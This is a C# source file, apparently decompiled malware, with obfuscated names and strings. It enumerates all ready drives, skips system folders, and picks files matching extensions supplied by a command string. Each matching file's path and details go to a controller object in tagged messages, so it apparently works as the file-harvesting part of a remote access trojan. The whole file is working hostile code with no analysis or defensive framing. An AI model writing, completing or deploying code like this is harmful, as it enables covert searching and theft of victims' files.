using System;
using System.Collections.Generic;
using System.IO;

namespace hdrmiprcav;

internal class DEROIVF
{
	public List<string> ex_folders = new List<string>();

	public int file_index = 0;

	public List<string> irvrmjavhicrsFildes = new List<string>();

	public int fIndx = 0;

	public bool is_reading = false;

	public MROIDM core_svr;

	public List<string> file_exts = new List<string>();

	public DEROIVF()
	{
		ex_folders.Add("program files|".Split(new char[1] { '|' })[0]);
		ex_folders.Add("system volume information|".Split(new char[1] { '|' })[0]);
		ex_folders.Add("windows|".Split(new char[1] { '|' })[0]);
		ex_folders.Add("program files (x86)|".Split(new char[1] { '|' })[0]);
		ex_folders.Add("programdata|".Split(new char[1] { '|' })[0]);
	}

	public bool dirs_access(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string lookup_drive()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public IEnumerable<string> add_up_files(string path)
	{
		Queue<string> dir_ques = new Queue<string>();
		dir_ques.Enqueue(path);
		while (dir_ques.Count > 0 && !core_svr.is_req_cancel)
		{
			path = dir_ques.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (dirs_access(text) && !ex_folders.Contains(text.ToLower()))
					{
						dir_ques.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void see_folders(string info_str)
	{
		core_svr.is_req_cancel = false;
		file_exts.Clear();
		irvrmjavhicrsFildes.Clear();
		fIndx = 0;
		file_index = 0;
		string[] array = info_str.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				file_exts.Add(text);
			}
		}
		if (array[1] != "")
		{
			is_reading = true;
			syn_dirs(array[1]);
			is_reading = false;
			core_svr.load_data(null, "seyard=seayhed|".Split(new char[1] { '|' })[0]);
		}
	}

	public string see_files(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string exp_folder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (dirs_access(text2))
				{
					text = text + text2 + ">|".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void syn_dirs(string path)
	{
		try
		{
			foreach (string item in add_up_files(path))
			{
				string extension = Path.GetExtension(item);
				if (file_exts.Contains(extension.ToLower()))
				{
					string text = core_svr.file_details(item, retn: true);
					core_svr.load_data(null, "seyarf=|".Split(new char[1] { '|' })[0] + item + "<SAVE_AUTO<|".Split(new char[1] { '|' })[0] + text);
				}
				if (core_svr.is_req_cancel)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}
}
